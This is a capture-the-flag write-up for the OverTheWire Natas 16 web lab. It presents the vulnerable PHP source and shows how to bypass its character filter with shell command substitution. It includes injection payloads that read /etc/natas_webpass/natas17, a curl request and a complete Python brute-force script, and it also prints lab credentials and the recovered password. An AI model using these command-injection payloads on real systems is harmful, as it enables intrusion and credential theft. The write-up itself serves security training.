# Over The Wire -- Natas 16

## Server URL
```
http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org
```

## Solution
Input box to find words.

Some filtering is applied to the input

The php source code :
```php
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas16", "pass": "<censored>" };</script></head>
<body>
<h1>natas16</h1>
<div id="content">

For security reasons, we now filter even more on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

We want to bypass
```php
passthru("grep -i \"$key\" dictionary.txt");
```

And this filter is applied on the input :
```php
preg_match('/[;|&`\'"]/',$key)
```

```
curl 'http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/?needle=.%22%20/etc/natas_webpass/natas17%20#&submit=Search'
```


We can use command substitution and grep to bruteforce the password.
We have control over the `$key` variable.
```
$(grep {POTENTIAL_PASSWD_REGEX} /etc/natas_webpass/natas17)
```

The full executed command will be :
```
grep -i "$(grep {POTENTIAL_PASSWD_REGEX} /etc/natas_webpass/natas17)" dictionary.txt
```

If there is no match with `{POTENTIAL_PASSWD_REGEX}`, the command substitution will return `""` and we execute
```
grep -i "" dictionary.txt
```
Which will print the whole dictionary file.
When this happen, we have a MISS.

If the output is empty (Trying to match the password in the dictionary.txt file will get no match) we got a HIT.

We can match the whole password using
```
grep -E ^[a-zA-Z0-9]\{32\}\$ /etc/natas_webpass/natas17
```

Submitting this input will return an empty string (HIT)
```
$(grep -E ^[a-zA-Z0-9]\{32\}\$ /etc/natas_webpass/natas17)
```

We could also extract one letter from the password so that we receive some output confirming the execution (We could get empty output from a syntax error) 
```
^$(expr substr $(grep -E ^[a-zA-Z0-9]\{32\}\$ /etc/natas_webpass/natas17) 2 1)
```
In this case, the second character is `p` (The first character is a number and there is no number in the dictionary).
We then got a hit if we have more than `0` values and less than `50000` (Approximately the number of lines in the dictionary file)

I first tried a full bruteforce approach but it was way too long.

I realised I could extract each character individually and grep the dictionary with it to retrieve every letters (The letter correspond to the first letter of the first word of the output).

But since the `-i` is used with grep, it does a case insensitive search.
Also, there is no numbers in the dictionary so when we receive an empty output, we can assume that the character is a number.

We solve this by first retrieving all the letters without case and determining where are the numbers.
We then bruteforce the numbers and bruteforce the lowercase vs uppercase.

We use this script to solve the challenge :
```py
import requests
import string

url = "http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org"

#############################
# Retrieve lowercase password

potential_passwd = ""
passwd_len = 32
for i in range(len(potential_passwd), passwd_len):
    cmd = f"^$(expr substr $(cat /etc/natas_webpass/natas17) {i+1} 1)"

    r = requests.get(url, params={'needle': cmd})

    resp = r.text.split('Output:\n<pre>')[1].split("</pre>")[0]

    dict_values = resp.split('\n')[1:-1]

    if len(dict_values) > 0:
        potential_passwd += dict_values[0][0].lower()
        print(f"Got a char -- {potential_passwd}")
    else:
        # This is probably a number
        print("Got a potential number")
        potential_passwd += "#"

print(f"Potential password : {potential_passwd}")

###########################
# Determine casing & digits

# Number of line in the complete dictionary.txt file
full_dict_len = 50000
so_far = ""
for i, char in enumerate(potential_passwd):
    char_left = 32 - len(so_far) - 1
    if char == "#":
        for digit in string.digits:
            trying = so_far + str(digit)
            print(f"Trying '{trying}'")

            cmd = f"^$(expr substr $(grep -E ^{trying}[a-zA-Z0-9]\\{{{char_left}\\}}\\$ /etc/natas_webpass/natas17) 2 1)"

            r = requests.get(url, params={'needle': cmd})

            resp = r.text.split('Output:\n<pre>')[1].split("</pre>")[0]
            dict_values = resp.split('\n')[1:-1]

            if 0 < len(dict_values) < full_dict_len:
                so_far += str(digit)
                print(f"Got a HIT --- {so_far}")
                break
    else:
        lowercase = True
        for j in range(2):
            trying_char = char.lower() if lowercase else char.upper()
            trying = so_far + trying_char
            print(f"Trying '{trying}'")

            cmd = f"^$(expr substr $(grep -E ^{trying}[a-zA-Z0-9]\\{{{char_left}\\}}\\$ /etc/natas_webpass/natas17) 2 1)"

            r = requests.get(url, params={'needle': cmd})

            resp = r.text.split('Output:\n<pre>')[1].split("</pre>")[0]
            dict_values = resp.split('\n')[1:-1]

            if 0 < len(dict_values) < full_dict_len:
                so_far += trying_char
                print(f"Got a HIT --- {so_far}")
                break
            else:
                lowercase = not lowercase

print(f"Natas17 password is '{so_far}'")
```

The password for natas17 is :
```
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```
